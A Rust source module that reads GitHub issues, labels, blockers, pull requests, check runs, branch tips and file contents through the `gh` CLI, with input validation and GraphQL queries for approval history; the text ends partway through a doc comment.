//! Reads from GitHub: issues, comments, labels and pull requests.
//!
//! Each read runs `gh` through [`Tracker::gh`] and reads its answer, so the real `gh` and the
//! fake are read alike. Ported from the reading half of the runner's `src/tracker/github.ts`,
//! and from `src/tracker/approvalHistory.ts`, the pure half of the approval rule.

use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};

use serde::de::DeserializeOwned;

use super::gh::{invalid_argument, one_line, parse_error};
use super::{OtherKind, Tracker, TrackerError};
use crate::factory::lifecycle::approval::{Approval, Refusal, TextCheck};
use crate::factory::lifecycle::{State, depends_on};
use crate::factory::text::is_commit_id;

// ---------------------------------------------------------------------------------------------
// Shared: running a read and decoding its answer.
// ---------------------------------------------------------------------------------------------

/// Runs a read and decodes its stdout as JSON of the shape `T`; serde's complaint joins
/// `expected`.
pub(crate) fn gh_json<T, G>(gh: &G, args: &[String], expected: &str) -> Result<T, TrackerError>
where
    T: DeserializeOwned,
    G: Tracker + ?Sized,
{
    let stdout = gh.gh(args)?;
    decode(args, expected, &stdout)
}

/// Decodes `text` as JSON of the shape `T`, or the parse error for the call with `args`.
pub(crate) fn decode<T: DeserializeOwned>(
    args: &[String],
    expected: &str,
    text: &str,
) -> Result<T, TrackerError> {
    serde_json::from_str(text).map_err(|error| decode_error(args, expected, &error))
}

/// The parse error for the call with `args`, with serde's complaint on one line.
fn decode_error(args: &[String], expected: &str, error: &serde_json::Error) -> TrackerError {
    let why = error
        .to_string()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    parse_error(args, &format!("{expected} ({why})"))
}

/// Runs `gh api --paginate` and collects the rows of every JSON array in stdout: gh prints
/// either one merged array or one array per page.
pub(crate) fn gh_pages<T, G>(
    gh: &G,
    args: &[String],
    expected: &str,
) -> Result<Vec<T>, TrackerError>
where
    T: DeserializeOwned,
    G: Tracker + ?Sized,
{
    let stdout = gh.gh(args)?;
    let mut rows = Vec::new();
    let mut pages = 0;
    for page in serde_json::Deserializer::from_str(&stdout).into_iter::<Vec<T>>() {
        rows.extend(page.map_err(|error| decode_error(args, expected, &error))?);
        pages += 1;
    }
    if pages == 0 {
        return Err(parse_error(args, &format!("{expected} (output was empty)")));
    }
    Ok(rows)
}

/// The arguments of a GraphQL `query` about issue or pull request `number` of `repo`, or the
/// parse error for a repo not written as `owner/name`.
pub(crate) fn issue_query_args(
    repo: &str,
    query: &str,
    number: u64,
) -> Result<Vec<String>, TrackerError> {
    let Some((owner, name)) = repo.split_once('/') else {
        return Err(parse_error(
            &["api".into(), "graphql".into()],
            &format!("a repo written as owner/name, got `{repo}`"),
        ));
    };
    Ok(vec![
        "api".into(),
        "graphql".into(),
        "-f".into(),
        format!("query={query}"),
        "-f".into(),
        format!("owner={owner}"),
        "-f".into(),
        format!("name={name}"),
        "-F".into(),
        format!("number={number}"),
    ])
}

/// `text` quoted for an error message, on one line.
pub(crate) fn quoted(text: &str) -> String {
    format!("\"{}\"", one_line(text))
}

/// Whether `text` is GitHub's uniform UTC form `YYYY-MM-DDTHH:MM:SSZ`, so ordering the text
/// orders the times.
pub fn is_utc_second(text: &str) -> bool {
    let b = text.as_bytes();
    let digits = |range: std::ops::Range<usize>| b[range].iter().all(u8::is_ascii_digit);
    b.len() == 20
        && digits(0..4)
        && b[4] == b'-'
        && digits(5..7)
        && b[7] == b'-'
        && digits(8..10)
        && b[10] == b'T'
        && digits(11..13)
        && b[13] == b':'
        && digits(14..16)
        && b[16] == b':'
        && digits(17..19)
        && b[19] == b'Z'
}

/// Whether an account's login is an instructor's, in ASCII case. A deleted account (none)
/// never is.
pub fn is_instructor(login: Option<&str>, instructors: &[String]) -> bool {
    login.is_some_and(|login| {
        instructors
            .iter()
            .any(|name| name.eq_ignore_ascii_case(login))
    })
}

// Listings, one issue, blockers, pull requests, checks, branches and files.

/// How many issues one listing of a label reads; past this the oldest are left out.
pub const LIST_LIMIT: usize = 200;

/// The most a file read through the contents API may be. A project config is a few lines.
pub const MAX_FILE_BYTES: u64 = 64 * 1024;

/// The most issues a `## Depends on` section may name. Each costs a `gh` call on every check,
/// so a longer list is refused rather than read.
pub const MAX_DEPENDS_ON: usize = 100;

/// An open issue in a listing.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct IssueSummary {
    pub number: u64,
    pub title: String,
    pub assignees: Vec<String>,
    /// The label names.
    pub labels: Vec<String>,
}

/// `cut` is set when the listing had more than [`LIST_LIMIT`] items.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Listing<T> {
    pub items: Vec<T>,
    pub cut: bool,
}

/// One issue as `gh issue view` reads it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct IssueDetail {
    pub number: u64,
    pub title: String,
    /// Empty for an issue with no description.
    pub body: String,
    pub labels: Vec<String>,
    pub assignees: Vec<String>,
    /// The author's login; `None` when GitHub gives none (a deleted account).
    pub author: Option<String>,
    /// The state of the one `factory:*` label; `None` for none, several or an unknown one.
    pub state: Option<State>,
    /// GitHub has the issue closed.
    pub closed: bool,
}

/// One issue as [`issue_labels`] reads it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct IssueLabels {
    pub number: u64,
    /// The label names.
    pub labels: Vec<String>,
    /// GitHub has the issue closed.
    pub closed: bool,
}

/// An open issue that blocks another one.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Blocker {
    /// `owner/name` of the repo the blocking issue is in.
    pub repo: String,
    pub number: u64,
}

/// Whether GitHub can merge a pull request into its base. GitHub computes it lazily: the read
/// that answers `Unknown` starts the computation, and a later read usually has the answer.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Mergeable {
    Mergeable,
    Conflicting,
    Unknown,
}

/// One pull request, as `gh pr view` reads it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PullRequest {
    pub number: u64,
    pub is_draft: bool,
    /// Neither merged nor closed.
    pub open: bool,
    /// Merged into its base.
    pub merged: bool,
    /// The branch the pull request comes from.
    pub head_ref: String,
    /// The head is in a fork, not in this repo.
    pub cross_repository: bool,
    /// The branch the pull request merges into.
    pub base_ref: String,
    /// The commit the head branch points at, as GitHub reports it.
    pub head_sha: String,
    pub mergeable: Mergeable,
    /// When it was opened, as GitHub writes it: `YYYY-MM-DDTHH:MM:SSZ`.
    pub created_at: String,
}

/// An open pull request as a listing gives it. Forks and other bases are listed too: the
/// caller decides which is the factory's own.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct OpenPullRequest {
    pub number: u64,
    pub url: String,
    pub head_ref: String,
    pub base_ref: String,
    pub cross_repository: bool,
    /// The login that opened it; `None` when GitHub names none.
    pub author: Option<String>,
}

/// How one required check stands on a commit: `Passed` when every run completed as `success`
/// or `neutral`, `Failed` when one completed as anything else, `Pending` when a run has not
/// completed, and `Missing` when no run of that name has a result or a run was skipped and
/// none failed or is pending.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CheckState {
    Passed,
    Failed,
    Pending,
    Missing,
}

/// One required check as read for a commit.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CheckStatus {
    /// The name that was asked for.
    pub name: String,
    pub state: CheckState,
    /// What GitHub says about the run that decided `state`: its conclusion when it completed,
    /// its status when it did not, and empty for a check with no run at all.
    pub conclusion: String,
    /// The run's page on GitHub, when it has one.
    pub url: Option<String>,
}

/// The fields `open_pull_requests_on_head` asks `gh pr list` for.
const PR_LIST_FIELDS: &str = "number,url,headRefName,baseRefName,isCrossRepository,author";

#[derive(serde::Deserialize)]
struct RawLogin {
    login: String,
}

#[derive(serde::Deserialize)]
struct RawLabel {
    name: String,
}

#[derive(serde::Deserialize)]
struct RawIssueSummary {
    number: u64,
    title: String,
    assignees: Vec<RawLogin>,
    labels: Vec<RawLabel>,
}

#[derive(serde::Deserialize, PartialEq, Eq)]
#[serde(rename_all = "UPPERCASE")]
enum IssueState {
    Open,
    Closed,
}

/// The answer to [`issue_labels`]'s query: each alias with the issue it found, or null.
#[derive(serde::Deserialize)]
struct RawLabelledAnswer {
    data: HashMap<String, Option<RawLabelled>>,
}

/// An issue the batched read found. GitHub answers an empty object for a number it has as
/// something other than an issue, so every field may be missing.
#[derive(serde::Deserialize)]
struct RawLabelled {
    #[serde(default)]
    number: Option<u64>,
    #[serde(default)]
    state: Option<IssueState>,
    #[serde(default)]
    labels: Option<RawLabelNodes>,
}

#[derive(serde::Deserialize)]
struct RawLabelNodes {
    nodes: Vec<RawLabel>,
}

#[derive(serde::Deserialize)]
struct RawIssueView {
    number: u64,
    title: String,
    #[serde(default)]
    body: Option<String>,
    labels: Vec<RawLabel>,
    assignees: Vec<RawLogin>,
    state: IssueState,
    #[serde(default)]
    author: Option<RawLogin>,
}

#[derive(serde::Deserialize)]
struct RawBlocker {
    number: u64,
    state: String,
    #[serde(default)]
    repository_url: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawIssueBody {
    #[serde(default)]
    body: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawRestState {
    state: String,
}

#[derive(serde::Deserialize)]
struct RawRepoView {
    #[serde(default)]
    default_branch: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawRefObject {
    sha: String,
    #[serde(rename = "type")]
    kind: String,
}

#[derive(serde::Deserialize)]
struct RawRefView {
    object: RawRefObject,
}

#[derive(serde::Deserialize)]
struct RawPullRequest {
    number: u64,
    #[serde(rename = "isDraft")]
    is_draft: bool,
    state: String,
    #[serde(rename = "headRefName")]
    head_ref_name: String,
    #[serde(rename = "isCrossRepository")]
    is_cross_repository: bool,
    #[serde(rename = "baseRefName")]
    base_ref_name: String,
    #[serde(rename = "headRefOid")]
    head_ref_oid: String,
    mergeable: String,
    #[serde(rename = "createdAt")]
    created_at: String,
}

#[derive(serde::Deserialize)]
struct RawListedAuthor {
    login: String,
    /// `__typename` comes from GraphQL alone: `gh pr list` already writes a bot as `app/<slug>`.
    #[serde(rename = "__typename", default)]
    typename: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawListedPullRequest {
    number: u64,
    url: String,
    #[serde(rename = "headRefName")]
    head_ref_name: String,
    #[serde(rename = "baseRefName")]
    base_ref_name: String,
    #[serde(rename = "isCrossRepository")]
    is_cross_repository: bool,
    #[serde(default)]
    author: Option<RawListedAuthor>,
}

#[derive(serde::Deserialize)]
struct RawCheckRun {
    name: String,
    status: String,
    #[serde(default)]
    conclusion: Option<String>,
    #[serde(default)]
    html_url: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawFileView {
    #[serde(rename = "type")]
    kind: String,
    #[serde(default)]
    encoding: Option<String>,
    size: u64,
    #[serde(default)]
    content: Option<String>,
}

/// Failed beats pending beats missing beats passed: a check passes only when every run passed.
fn check_rank(state: CheckState) -> u8 {
    match state {
        CheckState::Failed => 3,
        CheckState::Pending => 2,
        CheckState::Missing => 1,
        CheckState::Passed => 0,
    }
}

/// The state one check run decides, and the word GitHub gave for it.
fn check_outcome(status: &str, conclusion: Option<&str>) -> (CheckState, String) {
    if status != "completed" {
        return (CheckState::Pending, status.to_string());
    }
    match conclusion {
        Some(word @ ("success" | "neutral")) => (CheckState::Passed, word.to_string()),
        // Nothing ran. The factory's pull request is a draft until the checks pass, and a job
        // guarded by "not a draft" is skipped on it.
        Some("skipped") => (CheckState::Missing, "skipped".to_string()),
        other => (CheckState::Failed, other.unwrap_or("completed").to_string()),
    }
}

/// Standard base64 as GitHub's contents API writes it: wrapped with newlines, padded with `=`.
/// `None` for anything else, including data after padding and padding that does not fit the
/// length.
fn decode_base64(text: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    let mut bits: u32 = 0;
    let mut have: u32 = 0;
    let mut padding = 0;
    for c in text.chars() {
        let value = match c {
            'A'..='Z' => c as u32 - 'A' as u32,
            'a'..='z' => c as u32 - 'a' as u32 + 26,
            '0'..='9' => c as u32 - '0' as u32 + 52,
            '+' => 62,
            '/' => 63,
            '=' => {
                padding += 1;
                continue;
            }
            '\n' | '\r' => continue,
            _ => return None,
        };
        // Nothing may follow padding.
        if padding > 0 {
            return None;
        }
        bits = (bits << 6) | value;
        have += 6;
        if have >= 8 {
            have -= 8;
            out.push(((bits >> have) & 0xff) as u8);
            bits &= (1 << have) - 1;
        }
    }
    // What is left over is padding bits, which must be zero, and the padding must fit.
    let fits =
        (have == 0 && padding == 0) || (have == 4 && padding == 2) || (have == 2 && padding == 1);
    (fits && bits == 0).then_some(out)
}

/// A branch name as a path under `refs/heads/` in the API; `None` for a name that could leave
/// it.
fn encode_branch(branch: &str) -> Option<String> {
    if !is_branch_path(branch) {
        return None;
    }
    let mut out = String::new();
    for byte in branch.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.' | b'_' | b'~' | b'/') {
            out.push(byte as char);
        } else {
            out.push_str(&format!("%{byte:02X}"));
        }
    }
    Some(out)
}

fn is_plain_segment(part: &str) -> bool {
    part != "."
        && part != ".."
        && !part.is_empty()
        && part
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
}

/// The open issues with `state`'s label.
pub fn list_issues<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    state: State,
) -> Result<Listing<IssueSummary>, TrackerError> {
    let args = vec![
        "issue".to_string(),
        "list".into(),
        "--repo".into(),
        repo.into(),
        "--state".into(),
        "open".into(),
        "--label".into(),
        state.label().into(),
        "--limit".into(),
        (LIST_LIMIT + 1).to_string(),
        "--json".into(),
        "number,title,assignees,labels".into(),
    ];
    let raw: Vec<RawIssueSummary> = gh_json(gh, &args, "a JSON array of issues")?;
    let cut = raw.len() > LIST_LIMIT;
    let items = raw
        .into_iter()
        .take(LIST_LIMIT)
        .map(|item| IssueSummary {
            number: item.number,
            title: item.title,
            assignees: item.assignees.into_iter().map(|a| a.login).collect(),
            labels: item.labels.into_iter().map(|l| l.name).collect(),
        })
        .collect();
    Ok(Listing { items, cut })
}

/// One issue with its labels, assignees, body, author and state.
pub fn issue<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    number: u64,
) -> Result<IssueDetail, TrackerError> {
    let args = vec![
        "issue".to_string(),
        "view".into(),
        number.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "number,title,body,labels,assignees,state,author".into(),
    ];
    let raw: RawIssueView = gh_json(gh, &args, "an object describing an issue")?;
    let labels: Vec<String> = raw.labels.into_iter().map(|l| l.name).collect();
    let factory: Vec<&String> = labels
        .iter()
        .filter(|name| name.starts_with("factory:"))
        .collect();
    let state = match factory.as_slice() {
        [one] => State::from_label(one),
        _ => None,
    };
    Ok(IssueDetail {
        number: raw.number,
        title: raw.title,
        body: raw.body.unwrap_or_default(),
        assignees: raw.assignees.into_iter().map(|a| a.login).collect(),
        author: raw.author.map(|a| a.login),
        state,
        closed: raw.state == IssueState::Closed,
        labels,
    })
}

/// The fragment [`issue_labels`] reads each issue by. GitHub puts at most 100 labels on an
/// issue, so one page holds them all.
const LABELLED_FRAGMENT: &str =
    "fragment Labelled on Issue { number state labels(first: 100) { nodes { name } } }";

/// How many issues one [`issue_labels`] call reads, so a query stays well inside the argument
/// size and GitHub's limits however many numbers are asked for.
const LABELLED_PER_CALL: usize = 100;

/// The labels and open or closed state of each issue numbered, read 100 to a GraphQL call
/// (one call up to 100 numbers, none for no number); any failed call fails the read. A number
/// GitHub has no issue for is not in the answer: each is looked up by its URL, which GitHub
/// answers with null, where `issue(number:)` would fail the whole call.
pub fn issue_labels<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    numbers: &[u64],
) -> Result<BTreeMap<u64, IssueLabels>, TrackerError> {
    let numbers: Vec<u64> = numbers
        .iter()
        .copied()
        .collect::<BTreeSet<u64>>()
        .into_iter()
        .collect();
    if numbers.is_empty() {
        return Ok(BTreeMap::new());
    }
    // Each URL names the repo, so one not written as a plain `owner/name` would send every
    // lookup elsewhere and let every run go: refuse it before any call.
    let plain = repo
        .split_once('/')
        .is_some_and(|(owner, name)| is_plain_segment(owner) && is_plain_segment(name));
    if !plain {
        return Err(invalid_argument(repo, "a repo written as owner/name"));
    }
    let mut found = BTreeMap::new();
    for chunk in numbers.chunks(LABELLED_PER_CALL) {
        found.extend(issue_labels_of(gh, repo, chunk)?);
    }
    Ok(found)
}

/// One call of [`issue_labels`]: `numbers`, at most [`LABELLED_PER_CALL`] of them. Each URL is
/// passed as a variable, so the query text holds nothing read from outside.
fn issue_labels_of<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    numbers: &[u64],
) -> Result<BTreeMap<u64, IssueLabels>, TrackerError> {
    let declared: Vec<String> = numbers.iter().map(|n| format!("$u{n}: URI!")).collect();
    let asked: Vec<String> = numbers
        .iter()
        .map(|n| format!("i{n}: resource(url: $u{n}) {{ ...Labelled }}"))
        .collect();
    let mut args = vec![
        "api".to_string(),
        "graphql".into(),
        "-f".into(),
        format!(
            "query=query({}) {{ {} }} {LABELLED_FRAGMENT}",
            declared.join(", "),
            asked.join(" ")
        ),
    ];
    for n in numbers {
        args.push("-f".into());
        args.push(format!("u{n}=https://github.com/{repo}/issues/{n}"));
    }
    let answer: RawLabelledAnswer =
        gh_json(gh, &args, "a GraphQL response with each issue asked for")?;
    let mut found = BTreeMap::new();
    for &number in numbers {
        let Some(read) = answer.data.get(&format!("i{number}")) else {
            return Err(parse_error(
                &args,
                &format!("a GraphQL response naming issue {number}"),
            ));
        };
        // Null for no such issue, an object without a number for something other than an issue,
        // and another number for an issue the URL led elsewhere: none is the issue asked for.
        let Some(read) = read.as_ref().filter(|read| read.number == Some(number)) else {
            continue;
        };
        let (Some(state), Some(labels)) = (&read.state, &read.labels) else {
            return Err(parse_error(
                &args,
                &format!("issue {number} with its state and labels"),
            ));
        };
        found.insert(
            number,
            IssueLabels {
                number,
                labels: labels.nodes.iter().map(|l| l.name.clone()).collect(),
                closed: *state == IssueState::Closed,
            },
        );
    }
    Ok(found)
}

/// The open issues GitHub's dependency links say block `issue`.
pub fn open_blockers<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
) -> Result<Vec<Blocker>, TrackerError> {
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/issues/{issue}/dependencies/blocked_by"),
        "--paginate".into(),
    ];
    let listed: Vec<RawBlocker> = gh_pages(gh, &args, "JSON arrays of issues")?;
    let mut open = Vec::new();
    for raw in listed.into_iter().filter(|row| row.state != "closed") {
        // The blocker's repo is named in `repository_url`. Without it the caller would have to
        // guess, so the answer is an error and the issue is not claimed.
        let url = raw.repository_url.unwrap_or_default();
        let named = url
            .find("/repos/")
            .map(|cut| &url[cut + "/repos/".len()..])
            .unwrap_or("");
        let parts: Vec<&str> = named.split('/').collect();
        if parts.len() != 2 || parts[0].is_empty() || parts[1].is_empty() {
            return Err(parse_error(
                &args,
                &format!(
                    "issues that each name their repo in repository_url (#{} did not)",
                    raw.number
                ),
            ));
        }
        open.push(Blocker {
            repo: named.to_string(),
            number: raw.number,
        });
    }
    Ok(open)
}

/// The issues the body's `## Depends on` section names that are not closed.
pub fn text_blockers<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
) -> Result<Vec<Blocker>, TrackerError> {
    let body_args = vec![
        "issue".to_string(),
        "view".into(),
        issue.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "body".into(),
    ];
    let raw: RawIssueBody = gh_json(gh, &body_args, "an object with the issue's body")?;
    let named = depends_on::blockers(raw.body.as_deref().unwrap_or(""));
    if named.len() > MAX_DEPENDS_ON {
        return Err(parse_error(
            &body_args,
            &format!(
                "a Depends on section naming at most {MAX_DEPENDS_ON} issues, got {}",
                named.len()
            ),
        ));
    }
    let mut open = Vec::new();
    for reference in named {
        let named_repo = reference.repo.unwrap_or_else(|| repo.to_string());
        let args = vec![
            "api".to_string(),
            format!("repos/{named_repo}/issues/{}", reference.number),
        ];
        let read: RawRestState = gh_json(gh, &args, "an object with the issue's state")?;
        if read.state != "closed" {
            open.push(Blocker {
                repo: named_repo,
                number: reference.number,
            });
        }
    }
    Ok(open)
}

/// The pull request; `None` for a number the repo does not have.
pub fn pull_request<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    number: u64,
) -> Result<Option<PullRequest>, TrackerError> {
    let args = vec![
        "pr".to_string(),
        "view".into(),
        number.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "number,isDraft,state,headRefName,isCrossRepository,baseRefName,headRefOid,mergeable,createdAt"
            .into(),
    ];
    let stdout = match gh.gh(&args) {
        Ok(stdout) => stdout,
        Err(
            error @ (TrackerError::Other {
                kind: OtherKind::Failed,
                ..
            }
            | TrackerError::NotFound { .. }),
        ) if error
            .to_string()
            .to_lowercase()
            .contains("could not resolve to a pullrequest") =>
        {
            return Ok(None);
        }
        Err(error) => return Err(error),
    };
    let raw: RawPullRequest = decode(&args, "an object describing a pull request", &stdout)?;
    if !is_commit_id(&raw.head_ref_oid) {
        return Err(parse_error(
            &args,
            "a pull request and its full head commit id",
        ));
    }
    if !is_utc_second(&raw.created_at) {
        return Err(parse_error(
            &args,
            "a pull request's creation time as YYYY-MM-DDTHH:MM:SSZ",
        ));
    }
    Ok(Some(PullRequest {
        number: raw.number,
        is_draft: raw.is_draft,
        open: raw.state == "OPEN",
        merged: raw.state == "MERGED",
        head_ref: raw.head_ref_name,
        cross_repository: raw.is_cross_repository,
        base_ref: raw.base_ref_name,
        head_sha: raw.head_ref_oid,
        mergeable: match raw.mergeable.as_str() {
            "MERGEABLE" => Mergeable::Mergeable,
            "CONFLICTING" => Mergeable::Conflicting,
            _ => Mergeable::Unknown,
        },
        created_at: raw.created_at,
    }))
}

/// The open pull requests from a branch named `head`, forks included.
pub fn open_pull_requests_on_head<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    head: &str,
) -> Result<Vec<OpenPullRequest>, TrackerError> {
    if !is_plain_ref_name(head) {
        return Err(invalid_argument(head, "a plain branch name"));
    }
    let args = vec![
        "pr".to_string(),
        "list".into(),
        "--repo".into(),
        repo.into(),
        "--state".into(),
        "open".into(),
        "--head".into(),
        head.into(),
        "--limit".into(),
        "100".into(),
        "--json".into(),
        PR_LIST_FIELDS.into(),
    ];
    let rows: Vec<RawListedPullRequest> = gh_json(gh, &args, "a JSON array of pull requests")?;
    Ok(rows
        .into_iter()
        .map(|node| OpenPullRequest {
            number: node.number,
            url: node.url,
            head_ref: node.head_ref_name,
            base_ref: node.base_ref_name,
            cross_repository: node.is_cross_repository,
            author: match node.author {
                Some(author) if !author.login.is_empty() => {
                    if author.typename.as_deref() == Some("Bot") {
                        Some(format!("app/{}", author.login))
                    } else {
                        Some(author.login)
                    }
                }
                _ => None,
            },
        })
        .collect())
}

/// How each check in `names` stands on the commit `sha`.
pub fn checks<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    sha: &str,
    names: &[String],
) -> Result<Vec<CheckStatus>, TrackerError> {
    if !is_commit_id(sha) {
        return Err(invalid_argument(sha, "a full commit id"));
    }
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/commits/{sha}/check-runs?per_page=100&filter=latest"),
        "--paginate".into(),
        "--jq".into(),
        "[.check_runs[] | {name, status, conclusion, html_url}]".into(),
    ];
    let runs: Vec<RawCheckRun> = gh_pages(gh, &args, "JSON arrays of check runs")?;
    Ok(names
        .iter()
        .map(|name| {
            let mut found: Option<CheckStatus> = None;
            for run in runs.iter().filter(|run| &run.name == name) {
                let (state, conclusion) = check_outcome(&run.status, run.conclusion.as_deref());
                if found
                    .as_ref()
                    .is_none_or(|f| check_rank(state) > check_rank(f.state))
                {
                    // A link that does not point at GitHub is not passed on.
                    let url = run
                        .html_url
                        .as_ref()
                        .filter(|url| url.starts_with("https://github.com/"))
                        .cloned();
                    found = Some(CheckStatus {
                        name: name.clone(),
                        state,
                        conclusion,
                        url,
                    });
                }
            }
            found.unwrap_or_else(|| CheckStatus {
                name: name.clone(),
                state: CheckState::Missing,
                conclusion: String::new(),
                url: None,
            })
        })
        .collect())
}

/// The repo's default branch.
pub fn default_branch<G: Tracker + ?Sized>(gh: &G, repo: &str) -> Result<String, TrackerError> {
    let args = vec!["api".to_string(), format!("repos/{repo}")];
    let view: RawRepoView = gh_json(gh, &args, "an object with the repo's default branch")?;
    match view.default_branch {
        Some(branch) if !branch.is_empty() => Ok(branch),
        _ => Err(parse_error(
            &args,
            "an object with the repo's default branch (it had none)",
        )),
    }
}

/// The full commit id at the tip of `branch`.
pub fn branch_tip<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    branch: &str,
) -> Result<String, TrackerError> {
    let Some(encoded) = encode_branch(branch) else {
        return Err(invalid_argument(
            branch,
            "a branch name without empty or dot segments",
        ));
    };
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/git/ref/heads/{encoded}"),
    ];
    let view: RawRefView = gh_json(gh, &args, "an object with the commit the ref points at")?;
    if view.object.kind != "commit" || !is_commit_id(&view.object.sha) {
        return Err(parse_error(
            &args,
            "a commit and its full 40 or 64 digit id",
        ));
    }
    Ok(view.object.sha)
}

/// The text of the file at `path` in the commit `sha`.
pub fn file_at<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    path: &str,
    sha: &str,
) -> Result<String, TrackerError> {
    if !path.split('/').all(is_plain_segment) {
        return Err(invalid_argument(path, "a plain file path"));
    }
    if !is_commit_id(sha) {
        return Err(invalid_argument(sha, "a full commit id"));
    }
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/contents/{path}?ref={sha}"),
    ];
    let file: RawFileView = gh_json(gh, &args, "an object describing a file")?;
    let bad = |why: &str| parse_error(&args, &format!("a regular file read whole ({why})"));
    if file.kind != "file" {
        return Err(bad("it is not a regular file"));
    }
    if file.size > MAX_FILE_BYTES {
        return Err(bad("it is too big"));
    }
    if file.encoding.as_deref() != Some("base64") {
        return Err(bad("its content did not come as base64"));
    }
    let Some(bytes) = decode_base64(file.content.as_deref().unwrap_or("")) else {
        return Err(bad("its content is not valid base64"));
    };
    if bytes.len() as u64 != file.size {
        return Err(bad("its content is not as long as its size says"));
    }
    String::from_utf8(bytes).map_err(|_| bad("it is not UTF-8"))
}

/// Whether `branch` can be a path under `refs/heads/` in the API: no empty or dot segment.
/// `branch_tip` refuses any other name; a caller that wants its own words for the refusal
/// asks this first.
pub fn is_branch_path(branch: &str) -> bool {
    !branch
        .split('/')
        .any(|part| part.is_empty() || part == "." || part == "..")
}

/// Whether `name` can go into a ref the factory passes to git: not empty, not an option, no
/// whitespace or control character, no `..`.
pub fn is_plain_ref_name(name: &str) -> bool {
    !name.is_empty()
        && !name.starts_with('-')
        && !name.contains("..")
        && !name.chars().any(|c| c.is_whitespace() || c.is_control())
}

/// Whether `branch` can be written into a command a session runs (`git push origin
/// HEAD:<branch>` in a launch message): only the characters of an ordinary branch name, not an
/// option, no `..`. Stricter than [`is_plain_ref_name`], which only keeps a name safe as one
/// argument to git.
pub fn is_safe_branch_name(branch: &str) -> bool {
    !branch.is_empty()
        && branch
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'.' | b'_' | b'-'))
        && !branch.starts_with('-')
        && !branch.contains("..")
}

// Approval history, issue activity and pull request feedback.

/// How many label events and body edits the approval query asks for. A history this long may be
/// cut off.
pub const HISTORY_PAGE: usize = 100;

/// Any comment containing one of these was written by the factory: the runner's markers, and
/// Foundry's own (such as its claim comment).
const MARKER_PREFIXES: [&str; 2] = ["<!-- softfac", "<!-- foundry:"];

/// Whether `body` was written by the factory.
fn is_factory_comment(body: &str) -> bool {
    MARKER_PREFIXES.iter().any(|prefix| body.contains(prefix))
}

/// Who applied the issue's labels, who renamed it and who edited its body. `last: 100` of the
/// timeline items is the newest 100 (GitHub lists them oldest first), and
/// `userContentEdits(first: 100)` is the newest 100 edits (it lists newest first). Titles are
/// not asked for. `__typename` on an actor tells a person from a GitHub App.
pub const APPROVAL_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!) { ",
    "repository(owner: $owner, name: $name) { issue(number: $number) { ",
    "timelineItems(itemTypes: [LABELED_EVENT, UNLABELED_EVENT, RENAMED_TITLE_EVENT], last: 100) { ",
    "totalCount nodes { ",
    "__typename ",
    "... on LabeledEvent { createdAt actor { __typename login } label { name } } ",
    "... on UnlabeledEvent { createdAt actor { __typename login } label { name } } ",
    "... on RenamedTitleEvent { createdAt actor { __typename login } } } } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }",
);

/// The issue's body and who edited it last, with the history of its edits (newest first).
/// Comments are read separately, from REST.
pub const ACTIVITY_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!) { ",
    "repository(owner: $owner, name: $name) { issue(number: $number) { ",
    "body lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }",
);

/// Who edited comments, by node id, up to 100 ids in one call: the last editor and the last 100
/// edits of each. `Comment` is the interface that an issue comment implements. REST names only
/// the author, and anyone with write access can edit another person's comment. An id of a
/// comment that is gone answers `null`.
pub const COMMENT_EDITOR_QUERY: &str = concat!(
    "query($ids: [ID!]!) { nodes(ids: $ids) { ",
    "... on Comment { id lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }",
);

/// How many ids one [`COMMENT_EDITOR_QUERY`] call carries: the most `nodes` accepts.
const COMMENT_EDITOR_IDS: usize = 100;

/// The most pages of 50 reviews one feedback read takes: the newest and up to 19 earlier (20
/// points). 1,000 reviews is far past the factory's scale, so going on is GitHub misbehaving
/// and must not hold the pass open. A read pages back only to the last read that found nothing
/// new, so the limit is hit only by over 1,000 reviews between two such reads, and then every
/// read fails.
